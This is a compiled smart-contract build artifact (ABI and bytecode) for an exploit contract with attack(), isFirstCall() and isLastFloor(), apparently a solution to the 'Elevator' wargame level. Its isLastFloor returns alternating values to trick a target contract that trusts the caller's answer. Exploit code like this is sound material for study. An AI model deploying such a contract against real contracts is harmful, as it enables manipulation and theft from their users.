{"abi":[{"type":"constructor","inputs":[{"name":"_elevator","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"elevator","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"isFirstCall","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"isLastFloor","inputs":[{"name":"","type":"uint256","internalType":"uint256"}],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x60806040525f805460ff19166001179055348015601a575f5ffd5b506040516103563803806103568339810160408190526037916060565b5f80546001600160a01b0390921661010002610100600160a81b0319909216919091179055608b565b5f60208284031215606f575f5ffd5b81516001600160a01b03811681146084575f5ffd5b9392505050565b6102be806100985f395ff3fe608060405234801561000f575f5ffd5b506004361061004a575f3560e01c80635f9a4bca1461004e57806395697d3e146100765780639e5faafc14610082578063b0cb4ff01461008c575b5f5ffd5b61006161005c366004610245565b6100d5565b60405190151581526020015b60405180910390f35b5f546100619060ff1681565b61008a610102565b005b5f546100b090610100900473ffffffffffffffffffffffffffffffffffffffff1681565b60405173ffffffffffffffffffffffffffffffffffffffff909116815260200161006d565b5f805460ff16156100ee5750505f805460ff1916815590565b50505f805460ff1916600190811790915590565b5f805460408051602480820185905282518083039091018152604490910182526020810180517f243170cd000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff909116179052905161010090920473ffffffffffffffffffffffffffffffffffffffff1691610195919061025c565b5f604051808303815f865af19150503d805f81146101ce576040519150601f19603f3d011682016040523d82523d5f602084013e6101d3565b606091505b5050905080610242576040517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152600b60248201527f43616c6c206661696c6564000000000000000000000000000000000000000000604482015260640160405180910390fd5b50565b5f60208284031215610255575f5ffd5b5035919050565b5f82515f5b8181101561027b5760208186018101518583015201610261565b505f92019182525091905056fea26469706673582212207e2dc56dd025ce58db8776a79667d6eba532b79c398dc12d90f3c98960cb6aa264736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","elevator()":"b0cb4ff0","isFirstCall()":"95697d3e","isLastFloor(uint256)":"5f9a4bca"},"id":0}